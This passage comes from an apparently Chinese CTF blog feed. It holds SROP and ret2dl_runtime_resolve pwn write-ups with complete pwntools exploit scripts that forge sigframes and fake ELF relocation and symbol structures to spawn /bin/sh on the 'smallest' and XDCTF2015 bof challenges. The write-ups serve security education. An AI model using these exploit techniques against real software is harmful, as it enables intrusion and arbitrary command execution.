<span class="keyword">return</span> sys_read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接往<code>&amp;retaddr</code>写入值，就劫持控制流，首先我们肯定是要让它成功读入一个字节并从<code>0x4000B3</code>开始执行，这样就执行了<code>write(1,buf,0x400)</code>（<code>edx</code>和<code>esi</code>都没动），由于它只执行一次<code>read</code>，所以要往<code>&amp;retaddr</code>多写一点，就可以持续控制执行流，读完之后就跳到<code>0x4000B0</code>，又回来程序入口，这次就读入<code>\xb3</code>，修改返回的地址绕过清零<code>rax</code>的语句，就执行了<code>write(1,buf,0x400)</code>泄露栈地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x4000B0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment"># sleep(0.5)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">io.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br></pre></td></tr></table></figure><p>泄露完栈地址之后，就可以往栈上写<code>/bin/sh</code>执行<code>execve</code>啦！，但是在此之前还有一个问题就是栈顶的位置并不是指向我们的SROP的，所以还要做一次迁移到<code>sigframe</code>处，调用<code>SYS_read</code>来读入<code>execve</code>的<code>sigframe</code>顺便栈迁移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = <span class="number">0x004000BE</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0</span>)+<span class="built_in">str</span>(sigframe))</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x004000BE</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>再次SROP就能执行<code>execve(&quot;/bin/sh&quot;,0,0)</code></p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;smallest&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;,25243)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;smallest&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4000Be&quot;)</span></span><br><span class="line">payload = p64(<span class="number">0x4000B0</span>)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">stack_addr = u64(io.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#&amp; 0xfffffffffffffff000 - 0x1000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] stack_addr =&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = <span class="number">0x004000BE</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0</span>)+<span class="built_in">str</span>(sigframe))</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x004000BE</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x300</span>  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line"><span class="comment"># sigframe.rsp = stack_addr+ 0x190</span></span><br><span class="line">sigframe.rip = <span class="number">0x004000BE</span></span><br><span class="line">payload = p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0</span>)+<span class="built_in">str</span>(sigframe)</span><br><span class="line">payload = payload+(<span class="number">0x300</span>-<span class="built_in">len</span>(payload))*<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">io.send(p64(<span class="number">0x004000BE</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">raw_input(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.wangan.com/docs/1081"> SROP</a></p><p><a href="https://www.dazhuanlan.com/freedeaths/topics/1225728">360春秋杯smallest</a></p><p><a href="https://www.cnblogs.com/bhxdn/p/14281505.html">SROP例题</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl_runtime_resovle</title>
      <link href="/2021/10/05/ret2dl-runtime-resovle/"/>
      <url>/2021/10/05/ret2dl-runtime-resovle/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dl-runtime-resovle"><a href="#ret2dl-runtime-resovle" class="headerlink" title="ret2dl_runtime_resovle"></a>ret2dl_runtime_resovle</h1><blockquote><p>前面已经讲完了PLT和GOT表的作用，在那儿我留了一手，并没有讲清楚<code>_dl_runtime_resolve_</code>这个函数具体实现，还记得当时程序往栈上push了两个参数就进入<code>_dl_runtime_resolve_</code>了吗？不记得可以回去翻下</p></blockquote><p>我们回忆一下当时那两个参数是什么，没错，一个是<code>0</code>，一个是<code>0x804a004</code>，这里先讲他们是啥，0呢，我们先理解成一个Index，而<code>0x804a004</code>是一个函数地址叫<code>link_map</code>，其实<code>_dl_runtime_resolve_</code>是通过<code>link_map</code>来找到<code>.dynamic</code>的</p><img src="/2021/10/05/ret2dl-runtime-resovle/1.png" class=""><p>而.<code>dynamic</code>是什么呢？我们随便拉一个程序进IDA来看，我们可以看到里面有一些结构体，其实和<code>_dl_runtime_resolve_</code>紧密相关的只有三个：<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>，<code>DT_JMPREL</code>这三个根据地址我们可以发现它们指向了<code>.dynstr</code>，<code>.dynsym</code>，<code>.rel.plt</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/5.png" class=""><p><code>link_map+0x8</code>的位置就是它要找的<code>.dynamic</code>，接下来我们再通过<code>.dynamic</code>找到<code>.dynstr</code>， <code>.dynsym</code>，`.rel.plt</p><img src="/2021/10/05/ret2dl-runtime-resovle/3.png" class=""><p><code>.dynstr</code> 的地址是 <code>.dynamic + 0x44 -&gt; 0x0804821c</code></p><p><code>.dynsym</code> 的地址是 <code>.dynamic + 0x4c -&gt; 0x080481cc</code></p><p><code>.rel.plt</code> 的地址是 <code>.dynamic + 0x84 -&gt; 0x08048298</code></p><p>我们看上面的IDA也是这个地址</p><img src="/2021/10/05/ret2dl-runtime-resovle/4.png" class=""><p>到这里另外一个<code>push</code>到栈上的参数就起作用了</p><p>将<code>.rel.plt</code> 的地址加上参数 <code>reloc_arg</code>，即<code>0x8048298+0x0 = 0x8048298</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/6.png" class=""><p>这里就是重定位表项，这里也是一个结构体，将<code>r_info&gt;&gt;8</code>，即<code>0x00000107&gt;&gt;8 = 1</code>作为<code>.dynsym</code>中的下标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> Elf32_Addr  r_offset;<span class="comment">//指向GOT表的指针</span></span><br><span class="line"> Elf32_Word  r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/ret2dl-runtime-resovle/7.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> Elf32_Word  st_name; <span class="comment">//符号名偏移，也就是相对.dynstr的偏移</span></span><br><span class="line"> Elf32_Addr  st_value;<span class="comment">//该字段为0</span></span><br><span class="line"> Elf32_Word  st_size;<span class="comment">//该字段为0</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//导入符号，图中是0x12</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;<span class="comment">//该字段为0</span></span><br><span class="line"> Elf32_Section st_shndx;<span class="comment">//该字段为0</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p><code>.dynstr + st_name</code>就是这个函数的符号名字符串 </p><p><code>0x0804821c+0x1a = 0x8048236</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/8.png" class=""><p>IDA上的字符串表</p><img src="/2021/10/05/ret2dl-runtime-resovle/9.png" class=""><p>最后在动态链接库查找这个函数的地址，并且把地址赋值给<code>rel-&gt;r_offset</code>，即<code>GOT</code>表就可以了</p><p>前面已经讲解完了<code>_dl_runtime_resolve_</code>函数的执行流程，下面从源码层面来解析，不关键的代码已经删除</p><p>在进入<code>_dl_runtime_resolve_</code>函数之后它又<code>call _dl_fixup_</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/10.png" class=""><p>下面是<code>_dl_fixup_</code>的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123; </span><br><span class="line">  <span class="comment">//查找dynstr的位置</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">  <span class="comment">//查找重定位表的位置，这里的reloc_offset是reloc_arg的意思</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="comment">//查找reloc中的r_info结构体成员</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="comment">//判断低位是否为7</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  <span class="comment">//查找dynstr表中的字符串名字</span></span><br><span class="line">  result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">//将对应的函数地址放入GOT表中</span></span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过讲解<code>_dl_runtime_resolve_</code>函数，我们也很容易的想到利用点：</p><p>​    1.通过控制reloc_arg来实现伪造最终获取的函数字符串</p><p>​    2.修改.dynamic内存区域实现伪造最终获取的函数字符串</p><p>​    3.伪造link_map的地址</p><p>用一道经典例题讲解第一种情况</p><h4 id="XDCTF2015-bof"><a href="#XDCTF2015-bof" class="headerlink" title="XDCTF2015_bof"></a>XDCTF2015_bof</h4><p>先看看保护，我们看到开启了<code>Partial RELRO</code>，所以咱修改不了<code>.dynamic</code>，另外还开启了<code>NX</code>保护，也写不了<code>shellcode</code>到栈上</p><img src="/2021/10/05/ret2dl-runtime-resovle/12.png" class=""><p>程序的流程十分的简单，打印出<code>Welcome to XDCTF2015~!</code>，紧接着就是一个溢出函数</p><img src="/2021/10/05/ret2dl-runtime-resovle/13.png" class=""><p>我们按照正常的思路走一遍，一般拿到栈溢出，我们首先就是看有无<code>libc</code>，这题没有给出，然后就是后门函数，<code>system( )</code>函数，<code>/bin/sh</code>字符串，很遗憾都没有，看到这一般都会想到<code>ret2libc</code>，但是当我去查看<code>ROPgadget</code>的时候，发现这个动态链接的文件它的<code>gadget</code>少的离谱，所以<code>ret2libc</code>这条路也走不通了，那只能没有轮子咱们造一个轮子了—-<code>ret2dl_runtime_resovle</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/14.png" class=""><p>先通过<code>cyclic</code>计算一下溢出的偏移位置</p><img src="/2021/10/05/ret2dl-runtime-resovle/11.png" class=""><p>从源码中也可以看出它并没有对<code>reloc_arg</code>参数进行边界校验，导致我们即使传进去的<code>reloc_arg</code>再大，它也不会报错，所以我们就传入一个大的<code>reloc_arg</code>，将重定位表劫持到一个我们可控的地方，比如<code>.bss</code>段，所以很容易就可以想到，通过栈迁移将栈迁移到<code>.bss</code>段</p><p>根据上面的源码，我们可以知道，要构造的有3样东西<code>.rel.plt</code>，<code>.dynstr</code>，<code>.dynsym</code></p><p>我们一步步来，先伪造<code>.rel.plt</code>，<code>.rel.plt</code>有两个结构体成员，第一个是<code>r_offset</code>，为函数的<code>GOT</code>表地址，我们将其填写成<code>write</code>的<code>GOT</code>表地址，第二个是<code>r_info</code>，这个就比较重要了，我们先来回忆一下它是怎么被索引到的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rel.plt + reloc_arg = r_offset </span><br><span class="line"></span><br><span class="line">r_offset + <span class="number">4</span> = r_info</span><br></pre></td></tr></table></figure><p>我们刚刚说到源码中没有对<code>reloc_arg</code>参数进行边界校验，那我们就可以伪造<code>r_offset</code>和<code>r_info</code>到一个我们可控的地方</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rel.plt + fake_arg = fake_r_offset </span><br><span class="line"></span><br><span class="line">fake_r_offset  + <span class="number">4</span> = fake_r_info</span><br></pre></td></tr></table></figure><p>代码如下，我们先不关注<code>(fake_sym_addr - dynsym)/16</code>是什么我们先留个印象，这里为什么要加上7呢？因为要绕过这个<code>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">relo_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">relo_info = (((fake_sym_addr - dynsym)/<span class="number">16</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br></pre></td></tr></table></figure><p>接下来就是<code>.dynsym</code>，它怎么索引到<code>.dynsym</code>的呢，是不是<code>relo_info &gt;&gt; 8</code> 作为<code>.dynsym</code>中的下标，所以我们要在<code>relo_info</code>上做手脚，通过<code>(fake_sym_addr - dynsym)/16</code>来让它索引到<code>fake_dynsym</code>，除于<code>16</code>是因为一个<code>Elf32_Sym</code>大小是<code>16</code>字节，这里还要注意的是要进行对齐！！！</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_sym_addr = bss_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br></pre></td></tr></table></figure><p>最后就是<code>.dynstr</code>了，这个就很简单了，只需要构造<code>st_name</code>让他找到我们伪造的字符串，它原来是通过<code>.dynstr + st_name</code>来索引的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.dynstr + st_name = func_str</span><br><span class="line"></span><br><span class="line">.dynstr + fake_st_name = fake_func_str</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_str_addr = fake_sym_addr + <span class="number">16</span></span><br><span class="line"></span><br><span class="line">fake_name = fake_str_addr - strtab</span><br></pre></td></tr></table></figure><p>完整EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bof&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;bof&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> + stack_size</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">pop_ebp_ret = <span class="number">0x804861b</span></span><br><span class="line">leave_ret = <span class="number">0x8048458</span></span><br><span class="line">link_map = <span class="number">0x8048380</span></span><br><span class="line">dynsym = <span class="number">0x80481d8</span></span><br><span class="line">strtab = <span class="number">0x08048278</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span></span><br><span class="line">pop_esi_pop_edi_pop_ebp_ret = <span class="number">0x08048619</span></span><br><span class="line"><span class="comment">#align = 0x10 - ((bss_addr + 36 - dynsym) % 16) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pop_esi_pop_edi_pop_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#arge</span></span><br><span class="line">fake_relo_addr = bss_addr + <span class="number">28</span></span><br><span class="line">fake_arge = fake_relo_addr - rel_plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#sym</span></span><br><span class="line">fake_sym_addr = bss_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"></span><br><span class="line"><span class="comment">#relo</span></span><br><span class="line">relo_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">relo_info = (((fake_sym_addr - dynsym)/<span class="number">16</span>) &lt;&lt; <span class="number">8</span>)+<span class="number">0x7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;relo &quot;</span> + <span class="built_in">hex</span>(relo_info))</span><br><span class="line"></span><br><span class="line"><span class="comment">#str</span></span><br><span class="line">fake_str_addr = fake_sym_addr + <span class="number">16</span></span><br><span class="line">fake_name = fake_str_addr - strtab</span><br><span class="line">bin_sh_addr = bss_addr + <span class="number">80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(link_map)</span><br><span class="line">payload += p32(fake_arge)</span><br><span class="line">payload += <span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload += p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += p32(relo_offset)</span><br><span class="line">payload += p32(relo_info)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(fake_name)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += &quot;/bin/sh\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从MIPS的发展史开始学MIPS</title>
      <link href="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/"/>
      <url>/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/</url>
      
